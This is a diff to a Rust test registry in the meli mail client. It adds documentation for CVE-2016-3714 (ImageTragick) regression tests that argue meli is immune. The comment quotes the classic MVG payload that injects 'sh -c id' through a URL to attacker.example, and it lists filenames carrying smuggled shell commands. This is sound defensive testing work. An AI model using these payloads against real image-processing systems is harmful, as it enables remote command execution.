@@ -3673,3 +3673,74 @@ mod cve_2024_42010;
 #[cfg(test)]
 #[path = "CVE-2024-45516.rs"]
 mod cve_2024_45516;
+
+/// CVE-2016-3714（ImageMagick < 6.9.3-10、7.x < 7.0.1-1；CVSS v3.0 8.4
+/// `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`；CWE-78「OS 命令注入」）
+/// **ImageTragick 图片解码命令注入** regression（Gitea issue #118），调研报告
+/// 病毒/代码执行批次成员：ImageMagick 的 EPHEMERAL/MVG/MSL 等 coder 解析特制
+/// 图片时，把图片里 mail-controlled 的文本拼进一条系统命令再交给 shell 执行。
+/// 公告最经典的可利用形是 MVG 的
+///
+/// ```text
+/// push graphic-context
+/// viewbox 0 0 640 480
+/// fill 'url(https://attacker.example/x.png"|sh -c id;")'
+/// pop graphic-context
+/// ```
+///
+/// ——`fill 'url(...)'` 的 URL 里内嵌 `"|sh -c id;`，ImageMagick 把这段文本拼进
+/// 取图命令行后 shell 执行 `sh -c id`，任意命令注入 → RCE。MSL 的
+/// `<read>`/`<write>`、EPHEMERAL/label coder 的 `label:@/tmp/...` 是同一原语的
+/// 其它 spelling。邮件的攻击面在于：邮件客户端对**附件图片**做隐式缩略图/预览
+/// 时，自动把不可信图片喂给 ImageMagick，用户甚至不需要打开附件。
+///
+/// **meli 等价面映射（免疫证明）**：meli 是终端邮件客户端，**没有「对附件图片
+/// 做隐式解码/缩略图/预览」这条功能面**——等价面断言如下：
+///
+/// 1. **依赖面**：`meli/Cargo.toml`、`melib/Cargo.toml` 与 `Cargo.lock` 的整棵
+///    依赖树都没有 `image`/`imagemagick`/`magick`/`libvips`/`png`/`gif` 等图片
+///    解码 crate；`meli/src`、`melib/src` 里也不存在
+///    `Command::new("convert")`/`"magick"`/`"mogrify"` 之类的子进程调用点。
+///    ImageTragick 的触发前提（把不可信图片交给 ImageMagick）没有代码可运行。
+/// 2. **字节面**：附件字节在 meli 里自始至终是不透明数据。唯一的附件落地点
+///    [`File::create_temp_file`] 把 ImageTragick PoC 逐字节写进
+///    `<temp>/meli/<random>`，既不解析也不改写；melib 的解析层同样只把 PoC
+///    当附件字节（`Attachment::decode` 逐字节等于原图）。
+/// 3. **命令拼接面**：meli 里唯一把数据交给 `sh -c` 的通用边界是 mailcap
+///    [`MailcapEntry::run`]，而图片内容从不进入命令行——只有附件**文件名**
+///    会经 `%s` 变成临时路径。文件名是 mail-controlled 的，`sanitize_filename`
+///    还刻意保留 `$`/反引号/`;`/`|`/`>`，所以这里才是 meli 版 ImageTragick
+///    「图片元字符 → shell」的等价注入面，由 issue #57 的上下文感知 armor
+///    （`shell_quote_context` + `encode_for_context`）封堵。
+///
+/// [`cve_2016_3714`] 以五个分层 `#[test]` 锁定（详见模块内注释）：
+///
+/// 1. `no_image_decoder_dependency_or_subprocess_surface`：manifest + 锁文件 +
+///    全源码扫描，断言不存在任何图片解码功能面与 ImageMagick 子进程。
+/// 2. `image_tragick_payloads_land_byte_faithful_and_confined`：六种 MVG/MSL/
+///    EPHEMERAL PoC 经 `File::create_temp_file` 落盘逐字节保真、路径在
+///    `<temp>/meli/` 下、组件 ≤ `FILENAME_COMPONENT_MAX_BYTES`/`NAME_MAX`、
+///    单一平坦组件、无路径穿越、路径随机化。
+/// 3. `image_tragick_bytes_round_trip_as_opaque_attachment`：PoC 作为真实 MIME
+///    附件被 melib 解析后 `decode`/`raw` 仍是原字节。
+/// 4. `percent_s_filename_injection_is_inert_in_every_shell_context`：八种恶意
+///    附件名（`evil\`id\`.png`、`x;touch /tmp/pwned;.mvg`、含 `$()`/反引号/
+///    `;`/引号的 MVG/MSL 名）× 裸/双引号/反引号/`$()`/单引号/here-document
+///    六种 shell 上下文，marker 永不出现、命令以 0 正常退出、`%s` 恰好展开为
+///    单一实参、`id`/`pwned` 永不成为独立命令。
+/// 5. `nametemplate_percent_s_mvg_stays_single_argument`、
+///    `id_and_touch_payload_names_never_run_as_commands`、
+///    `shell_metacharacter_image_content_never_executes`：nametemplate、
+///    经典 `id`/`touch` 名与全部 PoC 正文的补充锁定。
+///
+/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——meli 没有 ImageMagick
+/// 或任何图片解码功能面，附件字节全程不透明，文件名/内容里的 shell 元字符在
+/// 六种上下文里都只是惰性字节。CVE 的「解码不可信图片 → 拼 shell 命令」原语
+/// 在 meli 中不可表达。
+///
+/// [`cve_2016_3714`]: self::cve_2016_3714
+/// [`File::create_temp_file`]: meli::types::File::create_temp_file
+/// [`MailcapEntry::run`]: meli::mailcap::MailcapEntry::run
+#[cfg(test)]
+#[path = "CVE-2016-3714.rs"]
+mod cve_2016_3714;
